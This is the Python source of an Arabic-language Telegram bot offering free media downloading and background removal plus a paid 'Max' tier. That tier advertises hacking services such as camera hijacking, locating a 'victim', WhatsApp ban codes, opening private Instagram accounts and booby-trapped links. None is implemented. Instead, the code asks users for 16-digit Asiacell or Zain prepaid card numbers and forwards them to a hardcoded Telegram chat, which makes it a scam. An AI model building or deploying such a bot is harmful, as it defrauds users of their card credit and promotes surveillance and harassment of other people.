import os
import telebot
from telebot import types
from flask import Flask
from threading import Thread
import re
import instaloader
import yt_dlp
import io
from PIL import Image
from rembg import remove

# إعداد الـ Token من متغيرات البيئة في Railway
TOKEN = os.environ.get('TOKEN')
bot = telebot.TeleBot(TOKEN)

# تهيئة انستالودر
L = instaloader.Instaloader(download_videos=True, download_pictures=True, save_metadata=False)

@bot.message_handler(commands=['start'])
def send_welcome(message):
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("الاشتراك المجاني", callback_data='free_sub'),
               types.InlineKeyboardButton("اشتراك ماكس ✨", callback_data='max_sub'))
    bot.send_message(message.chat.id, "أهلاً بك في ✨ 𝓜𝓐𝓧 𝓑𝓞𝓞𝓣 ✨", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    # قسم الاشتراكات المجانية
    if call.data == 'free_sub':
        my_free_names = [" 🌄تحميل ستوري ", "تحميل أي فيديو🎥", "تحويل الفيديو الى صوت🔊 ", "اازالة خلفية الصورة"]
        markup = types.InlineKeyboardMarkup(row_width=2)
        buttons = [types.InlineKeyboardButton(my_free_names[i], callback_data=f'f{i+1}') for i in range(4)]
        markup.add(*buttons)
        bot.edit_message_text("اختر الخدمة المجانية:", call.message.chat.id, call.message.message_id, reply_markup=markup)

    # معالجة الزر الأول (تحميل الستوري)
    elif call.data == 'f1':
        msg = bot.send_message(call.message.chat.id, "أرسل الآن يوزر (معرف) الحساب الذي تريد تحميل الستوري الخاص به:")
        bot.register_next_step_handler(msg, process_insta_username)
        
    elif call.data == 'f2': # هذا هو الزر الثاني
        msg = bot.send_message(call.message.chat.id, "أرسل لي رابط الفيديو الذي تريد تحميله الآن:")
        bot.register_next_step_handler(msg, process_video_link)
  
    elif call.data == 'f3': # الزر الثالث
        msg = bot.send_message(call.message.chat.id, "أرسل رابط الفيديو الذي تريد استخراج الصوت منه:")
        bot.register_next_step_handler(msg, process_audio_conversion)

    elif call.data == 'f4': # الزر الرابع
        msg = bot.send_message(call.message.chat.id, "📸 أرسل لي الصورة التي تريد إزالة خلفيتها الآن:")
        bot.register_next_step_handler(msg, process_remove_bg)

    
    # قسم اشتراك ماكس
    elif call.data == 'max_sub':
        my_names = [" 💀واتساب 🟡 ", "يوزرات تلي مميزة👑 ", "كود حظر واتس⚡️ ", "اختراق كاميرا📷 ", "معرفة موقع الضحية ","دعس حساب تيكتوك☠️ ", "أرقام فيك ✅ ", "فتح انستا برايفت👀 ", "فك حظر سافيوم994+ ", "كود حظر واتس",
                    "مزايا انستا ✨", "تلغيم رابط🌎 ", "ببجي🎮 ", "رشق انستا✅ ", "تفعيل التطبيقات برو ",
                    " 📱بليلردو لانهائي8 ", "اداة تيكتوك ترول ", "ازالة الاعلانات📢 ", "ارقام مفعلة حقيقيه✅", "تطبيقات ايفون برو "]
        
        markup = types.InlineKeyboardMarkup(row_width=2)
        buttons = [types.InlineKeyboardButton(my_names[i], callback_data=f'max_{i+1}') for i in range(20)]
        markup.add(*buttons)
        bot.edit_message_text("اختر خدمة ماكس المطلوبة:", call.message.chat.id, call.message.message_id, reply_markup=markup)
    
    elif call.data.startswith('max_'):
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("تفعيل ماكس ✨", callback_data='activate_max'))
        bot.edit_message_text("عذراً، أنت غير مشترك في خطة ماكس ✨", call.message.chat.id, call.message.message_id, reply_markup=markup)

    elif call.data == 'activate_max':
        markup = types.InlineKeyboardMarkup(row_width=2)
        markup.add(types.InlineKeyboardButton("🔴 Asiacell", callback_data='provider_asia'),
                   types.InlineKeyboardButton("🔵 Zain", callback_data='provider_zain'))
        bot.edit_message_text("اختر مزود الخدمة:", call.message.chat.id, call.message.message_id, reply_markup=markup)

    elif call.data.startswith('provider_'):
        provider = "آسياسيل" if call.data == 'provider_asia' else "زين"
        msg = bot.send_message(call.message.chat.id, f"تم اختيار {provider}.\nيرجى إرسال رقم البطاقة (16 رقماً فقط):")
        bot.register_next_step_handler(msg, lambda m: get_card_number(m, provider))

# دالة معالجة تحميل الستوري
def process_insta_username(message):
    username = message.text.replace('@', '').strip() # إزالة أي @ وإزالة المسافات
    wait_msg = bot.send_message(message.chat.id, f"🔍 جاري البحث عن ستوري {username}...")
    try:
        # إضافة User-Agent لزيادة فرصة القبول من إنستجرام
        L.user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        
        profile = instaloader.Profile.from_username(L.context, username)
        stories = L.get_stories(userids=[profile.userid])
        
        count = 0
        for story in stories:
            for item in story.get_items():
                count += 1
                if item.is_video:
                    bot.send_video(message.chat.id, item.video_url, caption=f"ستوري رقم {count}")
                else:
                    bot.send_photo(message.chat.id, item.url, caption=f"ستوري رقم {count}")
        
        if count == 0:
            bot.send_message(message.chat.id, "لم يتم العثور على أي ستوري حالياً.")
            
        bot.delete_message(message.chat.id, wait_msg.message_id)

    except Exception as e:
        # هنا أضفنا طباعة الخطأ في الـ Log لنعرف السبب الحقيقي إذا فشل
        print(f"Error: {e}")
        bot.send_message(message.chat.id, f"⚠️ حدث خطأ: تأكد أن الحساب عام واليوزر صحيح.\nتفاصيل: {str(e)[:50]}")


# دالة معالجة أرقام البطاقات
def get_card_number(message, provider):
    if message.text.isdigit() and len(message.text) == 16:
        bot.reply_to(message, "جاري التفعيل.. انتظر قليلاً.")
        try:
            bot.send_message(438077185, f"طلب جديد:\nالمزود: {provider}\nالرقم: {message.text}")
        except: pass
    else:
        msg = bot.reply_to(message, "خطأ: يرجى إرسال 16 رقماً فقط.")
        bot.register_next_step_handler(msg, lambda m: get_card_number(m, provider))


# دالة معالجة تحميل الفيديو من رابط
def process_video_link(message):
    url = message.text.strip()
    wait_msg = bot.send_message(message.chat.id, "⏳ جاري معالجة الرابط والتحميل، يرجى الانتظار...")
    
    try:
        ydl_opts = {
            'format': 'best', # اختيار أفضل جودة
            'outtmpl': 'video.mp4', # اسم الملف المؤقت
            'noplaylist': True,
        }
        
        with yt_dlp.YoutubeDL(ydl_opts) as ydl:
            ydl.download([url])
        
        # إرسال الفيديو للمستخدم
        with open('video.mp4', 'rb') as video:
            bot.send_video(message.chat.id, video)
            
        bot.delete_message(message.chat.id, wait_msg.message_id)
        # حذف الملف بعد الإرسال لتوفير المساحة في سيرفر Railway
        os.remove('video.mp4')
        
    except Exception as e:
        bot.send_message(message.chat.id, f"⚠️ حدث خطأ أثناء تحميل الفيديو، تأكد من الرابط.\nالخطأ: {str(e)}")
        bot.delete_message(message.chat.id, wait_msg.message_id)

def process_audio_conversion(message):
    url = message.text.strip()
    wait_msg = bot.send_message(message.chat.id, "⏳ جاري استخراج الصوت، يرجى الانتظار...")
    
    try:
        # إعدادات yt-dlp لاستخراج الصوت فقط
        ydl_opts = {
            'format': 'bestaudio/best',
            'postprocessors': [{
                'key': 'FFmpegExtractAudio',
                'preferredcodec': 'mp3',
                'preferredquality': '192',
            }],
            'outtmpl': 'audio.mp3',
        }
        
        with yt_dlp.YoutubeDL(ydl_opts) as ydl:
            ydl.download([url])
        
        # إرسال الملف الصوتي للمستخدم
        with open('audio.mp3', 'rb') as audio:
            bot.send_audio(message.chat.id, audio, caption="تم التحويل بنجاح! 🎵")
            
        bot.delete_message(message.chat.id, wait_msg.message_id)
        # حذف الملف بعد الإرسال
        os.remove('audio.mp3')
        
    except Exception as e:
        bot.send_message(message.chat.id, f"⚠️ حدث خطأ أثناء التحويل. تأكد من الرابط.\nالخطأ: {str(e)}")
        bot.delete_message(message.chat.id, wait_msg.message_id)

# دالة إزالة الخلفية
def process_remove_bg(message):
    try:
        if not message.photo:
            bot.send_message(message.chat.id, "❌ لم تقم بإرسال صورة! يرجى إرسال صورة.")
            return
            
        wait_msg = bot.send_message(message.chat.id, "⏳ جاري معالجة الصورة وإزالة الخلفية...")
        
        file_id = message.photo[-1].file_id
        file_info = bot.get_file(file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        
        input_image = Image.open(io.BytesIO(downloaded_file))
        output_image = remove(input_image)
        
        byte_arr = io.BytesIO()
        output_image.save(byte_arr, format='PNG')
        byte_arr = byte_arr.getvalue()
        
        bot.send_photo(message.chat.id, byte_arr, caption="✨ تم إزالة الخلفية بنجاح!")
        bot.delete_message(message.chat.id, wait_msg.message_id)
        
    except Exception as e:
        bot.send_message(message.chat.id, f"⚠️ حدث خطأ: {str(e)}")


app = Flask('')
@app.route('/')
def home(): return "البوت يعمل!"

if __name__ == "__main__":
    # ضبط الـ Port ديناميكياً ليعمل على Railway
    port = int(os.environ.get("PORT", 8080))
    Thread(target=lambda: app.run(host='0.0.0.0', port=port)).start()
    bot.infinity_polling()
